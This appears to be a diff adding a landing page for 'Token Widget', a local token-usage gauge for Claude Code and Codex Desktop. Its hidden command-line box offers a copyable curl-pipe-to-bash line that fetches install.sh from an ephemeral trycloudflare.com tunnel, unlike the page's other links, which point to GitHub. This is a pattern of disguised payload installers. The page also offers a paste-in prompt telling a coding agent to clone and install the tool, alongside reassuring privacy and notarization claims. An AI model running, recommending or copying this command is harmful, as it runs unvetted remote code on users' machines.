@@ -1,0 +1,303 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 64 64%27 fill=%27none%27><path d=%27M20.5 51.92A23 23 0 1 1 43.5 51.92%27 stroke=%27%235b6f00%27 stroke-width=%277%27 stroke-linecap=%27round%27/><path d=%27M32 9A23 23 0 0 1 48.26 15.74%27 stroke=%27%23b2c248%27 stroke-width=%277%27 stroke-linecap=%27round%27/><line x1=%2732%27 y1=%2732%27 x2=%2742.6%27 y2=%2721.4%27 stroke=%27%235b6f00%27 stroke-width=%276%27 stroke-linecap=%27round%27/><circle cx=%2732%27 cy=%2732%27 r=%275%27 fill=%27%235b6f00%27/><circle cx=%2732%27 cy=%2755%27 r=%273.5%27 fill=%27%23b2c248%27/></svg>">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Token Widget — see how hard your Agent is working</title>
+<meta name="description" content="A local-first token telemetry overlay for Claude Code and Codex Desktop. Live gauge, anomaly alarm, usage dashboard. Nothing leaves your machine.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    color-scheme: light;
+    --canvas: #f7f7f2;
+    --card: #ffffff;
+    --ink: #0e0f0c;
+    --charcoal: #292929;
+    --carbon: #454745;
+    --slate: #72726e;
+    --ash: #e3e3e3;
+    --stone: #d5d5d2;
+    --fog: #eaebe5;
+    --olive: #b2c248;
+    --forest: #5b6f00;
+    --forest-hover: #4c5616;
+    --fern: #788c15;
+    --sprout: #e5eacd;
+    --serif: "Playfair Display", Georgia, serif;
+    --sans: "DM Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--canvas);
+    color: var(--ink);
+    font: 400 16px/1.5 var(--sans);
+    letter-spacing: 0.01em;
+  }
+
+  nav {
+    position: sticky; top: 0; z-index: 20;
+    background: var(--card);
+    backdrop-filter: blur(16px);
+    border-bottom: 0.5px solid var(--stone);
+    box-shadow: rgba(0, 0, 0, 0.03) 0 0 36px;
+  }
+  .nav-inner {
+    display: flex; align-items: center; gap: 16px;
+    max-width: 1200px; margin: 0 auto; padding: 12px 24px;
+  }
+  .brand { display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px; color: var(--ink); text-decoration: none; }
+  .brand .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--olive); border: 1px solid var(--fern); }
+  .nav-links { display: flex; gap: 16px; margin-left: 24px; }
+  .nav-links a { color: var(--charcoal); font-size: 15px; text-decoration: none; }
+  .nav-links a:hover { color: var(--forest); }
+  nav .pill { margin-left: auto; }
+
+  .pill {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 10px 20px; border-radius: 9999px;
+    font: 500 16px/1.2 var(--sans); letter-spacing: 0.01em;
+    text-decoration: none; cursor: pointer; border: 1px solid transparent;
+  }
+  .pill.forest { background: var(--forest); color: #fcfcf8; }
+  .pill.forest:hover { background: var(--forest-hover); }
+  .pill.white { background: var(--card); color: var(--ink); border-color: var(--stone); }
+  .pill.white:hover { background: var(--fog); }
+  .pill.small { padding: 8px 16px; font-size: 14px; }
+
+  section.white { background: var(--card); }
+  .inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+
+  .hero {
+    display: grid; grid-template-columns: minmax(320px, 5fr) minmax(300px, 6fr);
+    gap: 48px; align-items: center; padding: 80px 0 88px;
+  }
+  .hero-copy { text-align: left; }
+  .announce {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--sprout); color: var(--ink);
+    border: 1px solid var(--stone); border-radius: 9999px;
+    padding: 8px 16px; font-size: 14px; text-decoration: none;
+  }
+  .announce b { color: var(--forest); font-weight: 500; }
+  .announce:hover { border-color: var(--fern); }
+  .hero h1 {
+    margin: 28px 0 0;
+    font: 400 clamp(40px, 5.2vw, 64px)/1.02 var(--serif);
+    letter-spacing: -0.015em;
+  }
+  .hero .sub {
+    margin: 22px 0 0; max-width: 420px;
+    color: var(--slate); font-size: 20px; font-weight: 300; line-height: 1.45;
+  }
+  .cta-row { display: flex; gap: 16px; align-items: center; margin-top: 32px; flex-wrap: wrap; }
+  .cta-note { margin-top: 16px; color: var(--slate); font-size: 13px; letter-spacing: 0.13px; display: flex; align-items: center; gap: 6px; }
+  .cli-link { background: none; border: 0; padding: 0; color: var(--carbon); font: 400 14px var(--sans); text-decoration: underline; text-underline-offset: 3px; cursor: pointer; }
+  .cli-link:hover { color: var(--forest); }
+
+  .hero-visual { position: relative; min-height: 460px; }
+  .hero-visual .shot { position: absolute; background: var(--card); border: 0.5px solid var(--stone); border-radius: 12px; overflow: hidden; box-shadow: rgba(0,0,0,0.15) 0 8px 48px; }
+  .hero-visual .dash { top: 0; right: 0; width: min(88%, 560px); }
+  .hero-visual .widget { bottom: 24px; left: 0; width: 268px; }
+  .hero-visual img { display: block; width: 100%; height: auto; }
+
+  .hero-install { max-width: 520px; width: 100%; margin-bottom: 0 !important; }
+  .cli-box {
+    display: none; max-width: 640px; margin: 24px auto 0; text-align: left;
+    background: var(--card); border: 1px solid var(--ash); border-radius: 12px; padding: 20px 24px;
+  }
+  .cli-box.open { display: block; }
+  .cli-box h4 { margin: 0 0 8px; font: 500 13px/1.23 var(--sans); letter-spacing: 0.13px; color: var(--forest); text-transform: uppercase; }
+  .cli-line {
+    display: flex; align-items: center; gap: 10px;
+    background: var(--canvas); border: 1px solid var(--ash); border-radius: 8px;
+    padding: 10px 12px; margin-bottom: 16px;
+    box-shadow: rgba(0, 0, 0, 0.03) 0 0 2px inset;
+  }
+  .cli-line code { flex: 1; overflow-x: auto; white-space: nowrap; font: 13px/1.5 ui-monospace, "SF Mono", Menlo, monospace; color: var(--ink); }
+  .cli-line button {
+    flex: 0 0 auto; padding: 4px 14px; font: 500 13px/1.4 var(--sans);
+    color: var(--forest); background: var(--card); border: 1px solid var(--stone); border-radius: 9999px; cursor: pointer;
+  }
+  .cli-line button:hover { background: var(--sprout); }
+  .cli-box p { margin: 0; color: var(--slate); font-size: 13px; }
+
+  .product-strip {
+    display: flex; gap: 24px; align-items: flex-start; justify-content: center;
+    margin-top: 56px; flex-wrap: wrap;
+  }
+  .shot {
+    background: var(--card); border: 0.5px solid var(--stone); border-radius: 12px; overflow: hidden;
+  }
+  .shot img { display: block; width: 100%; height: auto; }
+  .product-strip > div:first-child { flex: 0 1 280px; }
+  .product-strip > div:last-child { flex: 1 1 460px; max-width: 720px; }
+  .shot-caption { margin-top: 10px; text-align: center; color: var(--slate); font-size: 13px; letter-spacing: 0.13px; }
+
+  .features { padding: 64px 0 96px; }
+  .features .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
+  .feature {
+    background: var(--canvas); border: 1px solid var(--ash); border-radius: 8px; padding: 24px;
+  }
+  .feature small { display: block; font: 500 13px/1.23 var(--sans); letter-spacing: 0.13px; color: var(--forest); text-transform: uppercase; margin-bottom: 8px; }
+  .feature h3 { margin: 0 0 8px; font: 400 24px/1.25 var(--serif); letter-spacing: 0.01em; }
+  .feature p { margin: 0; color: var(--slate); font-size: 15px; line-height: 1.5; }
+
+  .steps { padding: 64px 0; }
+  .steps h2, .privacy h2 { font: 400 36px/1.25 var(--serif); letter-spacing: -0.54px; text-align: center; margin: 0 0 32px; }
+  .steps ol { max-width: 560px; margin: 0 auto; padding-left: 24px; color: var(--carbon); }
+  .steps li { margin-bottom: 14px; line-height: 1.5; }
+  .steps li b { color: var(--ink); font-weight: 600; }
+
+  .privacy { padding: 64px 0 96px; }
+  .privacy .card {
+    max-width: 680px; margin: 0 auto; text-align: center;
+    background: var(--card); border: 1px solid var(--ash); border-radius: 12px; padding: 32px 40px;
+  }
+  .privacy .card h2 { font-size: 24px; margin-bottom: 12px; letter-spacing: 0.01em; }
+  .privacy .card p { margin: 0; color: var(--slate); font-size: 15px; line-height: 1.55; }
+
+  footer { border-top: 1px solid var(--ash); padding: 24px 0 48px; text-align: center; color: var(--slate); font-size: 13px; letter-spacing: 0.13px; }
+  footer a { color: var(--carbon); }
+
+  @media (max-width: 860px) {
+    .hero { grid-template-columns: 1fr; gap: 32px; }
+    .hero-visual { min-height: 0; }
+    .hero-visual .shot { position: static; margin: 0 0 16px; }
+    .hero-visual .widget { width: 268px; }
+  }
+  @media (max-width: 620px) {
+    .features .grid { grid-template-columns: 1fr; }
+    .nav-links { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="brand" href="index.html"><svg width="18" height="18" viewBox="0 0 64 64" fill="none" aria-hidden="true"><path d="M20.5 51.92A23 23 0 1 1 43.5 51.92" stroke="#5b6f00" stroke-width="7" stroke-linecap="round"/><path d="M32 9A23 23 0 0 1 48.26 15.74" stroke="#b2c248" stroke-width="7" stroke-linecap="round"/><line x1="32" y1="32" x2="42.6" y2="21.4" stroke="#5b6f00" stroke-width="6" stroke-linecap="round"/><circle cx="32" cy="32" r="5" fill="#5b6f00"/><circle cx="32" cy="55" r="3.5" fill="#b2c248"/></svg>Token Widget</a>
+    <div class="nav-links">
+      <a href="leaderboard.html">Leaderboard</a>
+      <a href="https://github.com/SergioChan/token-meter">GitHub</a>
+    </div>
+    <a class="pill forest small" href="/download/token-meter-macos.zip"> Download</a>
+  </div>
+</nav>
+
+<section class="white">
+  <div class="inner hero">
+    <div class="hero-copy">
+      <a class="announce" href="leaderboard.html">New · <b>Community leaderboard</b> &rarr;</a>
+      <h1>See how hard your Agent is working.</h1>
+      <p class="sub">Live gauge, runaway-context alarm, and your usage patterns. Without your data leaving the machine.</p>
+
+      <div class="cta-row">
+        <a class="pill forest" href="/download/token-widget.dmg" id="download-btn">Download for Mac&nbsp; &#8681;</a>
+        <button class="cli-link" type="button" id="cli-toggle">or install from the command line</button>
+      </div>
+      <p class="cta-note">✓&nbsp; Notarized by Apple · Claude Code and Codex Desktop on macOS</p>
+
+      <div class="cli-box" id="cli-box">
+        <h4>Terminal</h4>
+        <div class="cli-line">
+          <code id="cli-cmd">curl -fsSL https://borders-arabic-diameter-presenting.trycloudflare.com/install.sh | bash</code>
+          <button type="button" data-copy="cli-cmd">Copy</button>
+        </div>
+        <h4>Paste into Claude Code</h4>
+        <div class="cli-line">
+          <code id="agent-cmd">Install Token Widget on this Mac: clone https://github.com/SergioChan/token-meter.git and follow INSTALL_WITH_AGENT.md</code>
+          <button type="button" data-copy="agent-cmd">Copy</button>
+        </div>
+        <h4>From source</h4>
+        <div class="cli-line">
+          <code id="src-cmd">git clone https://github.com/SergioChan/token-meter.git && cd token-meter && npm run claude:install</code>
+          <button type="button" data-copy="src-cmd">Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="hero-visual" aria-hidden="false">
+      <div class="shot dash">
+        <img src="assets/dashboard.png" alt="Personal usage dashboard: lifetime tokens, streaks, token activity calendar, platform breakdown, cache hit rate" width="1240" height="940">
+      </div>
+      <div class="shot widget">
+        <img src="assets/widget-expanded.png" alt="The meter: live gauge, session total, 24-hour total, streak, lifetime tokens" width="288" height="222">
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="white features">
+  <div class="inner">
+    <div class="grid">
+      <div class="feature">
+        <small>Live telemetry</small>
+        <h3>A needle, not a percentage</h3>
+        <p>Tokens per minute against your own baseline. Red means this turn costs several times your normal.</p>
+      </div>
+      <div class="feature">
+        <small>Anomaly alarm</small>
+        <h3>Catches runaway context</h3>
+        <p>Flags context pollution, retry loops, and agent spirals before they eat another turn.</p>
+      </div>
+      <div class="feature">
+        <small>Identity</small>
+        <h3>Your @handle and dashboard</h3>
+        <p>Claim a handle. Click it for your calendar, streaks, cache hit rate, and platform breakdown.</p>
+      </div>
+      <div class="feature">
+        <small>Privacy</small>
+        <h3>Private by default</h3>
+        <p>Computed on your laptop. Sharing is opt-in and limited to signed totals — never content.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="steps">
+  <div class="inner">
+    <h2>Up and running in two minutes</h2>
+    <ol>
+      <li><b>Install</b> — download, double-click <i>Install Token Widget</i>.</li>
+      <li><b>Grant Accessibility</b> — one macOS permission, once.</li>
+      <li><b>Work</b> — the gauge appears with your session. Click <b>@your-handle</b> for the dashboard.</li>
+    </ol>
+  </div>
+</section>
+
+<section class="privacy">
+  <div class="inner">
+    <div class="card">
+      <h2>Local-first, verifiable</h2>
+      <p>Token Widget reads identifiers, timestamps, and token counts — never message content. It never patches the host apps. Open source: read every line.</p>
+    </div>
+  </div>
+</section>
+
+<footer>
+  MIT License · <a href="https://github.com/SergioChan/token-meter">GitHub</a> · <a href="leaderboard.html">Leaderboard</a> · Token Widget is an independent open-source project, not affiliated with Anthropic or OpenAI.
+</footer>
+
+<script>
+  document.getElementById("cli-toggle").addEventListener("click", () => {
+    document.getElementById("cli-box").classList.toggle("open");
+  });
+  for (const button of document.querySelectorAll("[data-copy]")) {
+    button.addEventListener("click", async () => {
+      const text = document.getElementById(button.dataset.copy).textContent;
+      try {
+        await navigator.clipboard.writeText(text);
+        button.textContent = "Copied ✓";
+      } catch {
+        button.textContent = "Select & copy";
+      }
+      setTimeout(() => { button.textContent = "Copy"; }, 1500);
+    });
+  }
+</script>
+</body>
+</html>
